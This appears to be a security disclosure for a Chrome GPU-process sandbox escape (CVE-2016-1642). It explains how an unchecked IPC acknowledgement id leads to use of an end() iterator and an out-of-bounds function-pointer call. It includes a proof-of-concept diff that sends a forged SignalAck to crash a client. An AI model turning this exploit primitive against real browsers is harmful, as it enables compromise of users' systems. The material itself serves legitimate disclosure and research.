@@ -1,0 +1,71 @@
+Chrome gpu process sandbox escape due to use of invalid iterator in IPC handler
+
+The unsandboxed chrome browser process is a client of the GPU process.
+
+The gpu process can send the following IPC message to all GPU process clients:
+
+    IPC_MESSAGE_HANDLER(GpuCommandBufferMsg_SignalAck,
+                        OnSignalAck);
+
+This message is supposed to be an Ack to a corresponding OnSignal* ipc sent by the GPU process client:
+
+    IPC_MESSAGE_HANDLER(GpuCommandBufferMsg_SignalSyncPoint,
+                        OnSignalSyncPoint)
+    IPC_MESSAGE_HANDLER(GpuCommandBufferMsg_SignalSyncToken,
+                        OnSignalSyncToken)
+    IPC_MESSAGE_HANDLER(GpuCommandBufferMsg_SignalQuery,
+                        OnSignalQuery)
+
+The implementation of CommandBufferProxyImpl::OnSignalAck fails however to verify that the SignalAck is actually an Ack to a message it sent:
+
+(this code runs in the GPU process client (eg browser process.))
+void CommandBufferProxyImpl::OnSignalAck(uint32 id) {
+  SignalTaskMap::iterator it = signal_tasks_.find(id);
+  DCHECK(it != signal_tasks_.end());
+  base::Closure callback = it->second;
+  signal_tasks_.erase(it);
+  callback.Run();
+}
+
+If the id (which is controlled by the GPU process) isn't in the signal_tasks_ map then the it iterator will be end(), which on some platforms is implemented at a pointer off the end of the corresponding hashmap's backing storage (see eg  bug 249064 .) In this case it's gonna end up reading a base::Closure OOB and calling a function pointer in there.
+
+git apply the following git diff output to repro (PoC will crash *a* client, not necessarily the browser process:)
+
+diff --git a/content/common/gpu/client/command_buffer_proxy_impl.cc b/content/common/gpu/client/command_buffer_proxy_impl.cc
+index b8785bc..d9a17d0 100644
+--- a/content/common/gpu/client/command_buffer_proxy_impl.cc
++++ b/content/common/gpu/client/command_buffer_proxy_impl.cc
+@@ -4,6 +4,8 @@
+ 
+ #include "content/common/gpu/client/command_buffer_proxy_impl.h"
+ 
++#include <stdio.h>
++
+ #include <vector>
+ 
+ #include "base/callback.h"
+@@ -148,6 +150,9 @@ void CommandBufferProxyImpl::RemoveDeletionObserver(
+ void CommandBufferProxyImpl::OnSignalAck(uint32 id) {
+   SignalTaskMap::iterator it = signal_tasks_.find(id);
+   DCHECK(it != signal_tasks_.end());
++  if (it == signal_tasks_.end()) {
++    printf("about to use an end() iter!\n");
++  }
+   base::Closure callback = it->second;
+   signal_tasks_.erase(it);
+   callback.Run();
+diff --git a/content/common/gpu/gpu_command_buffer_stub.cc b/content/common/gpu/gpu_command_buffer_stub.cc
+index 39a75d2..ce0569c 100644
+--- a/content/common/gpu/gpu_command_buffer_stub.cc
++++ b/content/common/gpu/gpu_command_buffer_stub.cc
+@@ -1020,6 +1020,7 @@ void GpuCommandBufferStub::OnSignalSyncToken(const gpu::SyncToken& sync_token,
+ }
+ 
+ void GpuCommandBufferStub::OnSignalAck(uint32 id) {
++  Send(new GpuCommandBufferMsg_SignalAck(route_id_, 0x41414141));
+   Send(new GpuCommandBufferMsg_SignalAck(route_id_, id));
+ }
+
+Chrome bug report: https://code.google.com/p/chromium/issues/detail?id=563964
+
+CVE-2016-1642
